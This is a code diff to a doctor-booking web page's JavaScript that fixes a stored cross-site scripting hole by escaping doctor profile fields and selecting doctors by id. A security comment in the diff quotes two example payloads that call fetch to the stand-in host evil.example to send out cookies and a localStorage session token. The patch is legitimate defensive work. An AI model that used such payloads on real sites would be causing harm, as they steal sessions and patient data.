@@ -731,6 +731,7 @@ let regionsData = [], specialtiesData = [];
 let currentDoctorEmail = '';
 let fetchedDoctors = []; // آخر قائمة أطباء تم جلبها (لأجل البحث)
 let allAppointments = []; // كل مواعيد الطبيب
+let selectedDoctorId = null;
 let selectedDoctorName = '';
 let selectedDoctorActive = true;
 let selectedDoctorSpecialty = '';
@@ -1065,21 +1066,40 @@ function renderDoctorsList(list) {
   cont.innerHTML='';
   if(!list.length){ cont.innerHTML='<p style="color:red;text-align:center">No doctors found.</p>'; return; }
   list.forEach(doc=>{
+    // SECURITY: doc.fullName/type/specialty/address come from the doctors
+    // table and are ultimately set by whatever a doctor typed at signup —
+    // any patient loading the doctor list runs this HTML. Previously these
+    // were interpolated into innerHTML (and into the onclick attribute)
+    // with NO escaping, so a doctor could register with a name like
+    // <img src=x onerror=fetch('https://evil.example/steal?c='+document.cookie)>
+    // or  '); fetch('https://evil.example/steal?ls='+localStorage.getItem('doctorSessionToken')); //
+    // and that would execute in every patient's browser (stored XSS), able
+    // to read localStorage (incl. other doctors' session tokens if they were
+    // ever logged in on a shared machine) and silently exfiltrate patient
+    // data typed into the booking form. All four fields are now escaped.
+    const safeName = escapeHtml(doc.fullName);
+    const safeType = escapeHtml(doc.type);
+    const safeSpecialty = doc.specialty ? ' - '+escapeHtml(doc.specialty) : '';
+    const safeAddress = escapeHtml(doc.address) || 'No address';
+    // Select by id (never by name) so two doctors who happen to share a
+    // name can't be confused with each other or trigger the backend's
+    // "multiple doctors share this name" rejection on every booking.
+    const safeId = Number(doc.id);
     if(doc.isActive) {
       cont.innerHTML+=`
       <div class="doc-card">
         <div>
-          <strong>${doc.fullName}</strong> ${doc.isVerified?verifiedBadgeMarkup(15):''} <span style="font-size:13px;color:#64748b">(${doc.type}${doc.specialty?' - '+doc.specialty:''})</span><br>
-          <small style="color:#64748b;display:inline-flex;align-items:center;gap:4px">${uiIcon('pin',14)}${doc.address||'No address'}</small>
+          <strong>${safeName}</strong> ${doc.isVerified?verifiedBadgeMarkup(15):''} <span style="font-size:13px;color:#64748b">(${safeType}${safeSpecialty})</span><br>
+          <small style="color:#64748b;display:inline-flex;align-items:center;gap:4px">${uiIcon('pin',14)}${safeAddress}</small>
         </div>
-        <button class="btn-success select-btn" style="width:auto;padding:9px 18px" onclick="selectDoctor('${doc.fullName}',true,this)">Select</button>
+        <button class="btn-success select-btn" style="width:auto;padding:9px 18px" onclick="selectDoctor(${safeId},this)">Select</button>
       </div>`;
     } else {
       cont.innerHTML+=`
       <div class="doc-card inactive">
         <div>
-          <strong>${doc.fullName}</strong> ${doc.isVerified?verifiedBadgeMarkup(15):''} <span style="font-size:13px;color:#64748b">(${doc.type}${doc.specialty?' - '+doc.specialty:''})</span><br>
-          <small style="color:#64748b;display:inline-flex;align-items:center;gap:4px">${uiIcon('pin',14)}${doc.address||'No address'}</small><br>
+          <strong>${safeName}</strong> ${doc.isVerified?verifiedBadgeMarkup(15):''} <span style="font-size:13px;color:#64748b">(${safeType}${safeSpecialty})</span><br>
+          <small style="color:#64748b;display:inline-flex;align-items:center;gap:4px">${uiIcon('pin',14)}${safeAddress}</small><br>
           <span style="color:var(--danger);font-size:13px;font-weight:600">Booking unavailable at this time</span>
         </div>
         <button disabled style="width:auto;padding:9px 18px;background:#e2e8f0;color:#94a3b8;border:none;border-radius:4px;font-weight:600">Unavailable</button>
@@ -1098,13 +1118,15 @@ function filterDoctorsList() {
   renderDoctorsList(filtered);
 }
 
-function selectDoctor(name, active, btn) {
-  selectedDoctorName = name;
-  selectedDoctorActive = active;
-  const doc = fetchedDoctors.find(d=>d.fullName===name);
-  selectedDoctorSpecialty = doc ? (doc.specialty || '') : '';
-  selectedDoctorType = doc ? (doc.type || '') : '';
-  document.getElementById('btnConfirm').disabled = !active;
+function selectDoctor(id, btn) {
+  const doc = fetchedDoctors.find(d=>Number(d.id)===Number(id));
+  if(!doc) return;
+  selectedDoctorId = doc.id;
+  selectedDoctorName = doc.fullName;
+  selectedDoctorActive = doc.isActive;
+  selectedDoctorSpecialty = doc.specialty || '';
+  selectedDoctorType = doc.type || '';
+  document.getElementById('btnConfirm').disabled = !doc.isActive;
 
   document.querySelectorAll('.select-btn').forEach(b=>{
     if (b !== btn) b.textContent = 'Select';
@@ -1122,6 +1144,7 @@ function submitBooking() {
     phone:     document.getElementById('phone').value,
     state:     document.getElementById('state').value,
     doctor:    selectedDoctorName,
+    doctorId:  selectedDoctorId,
     specialty: selectedDoctorSpecialty,
     type:      selectedDoctorType
   };
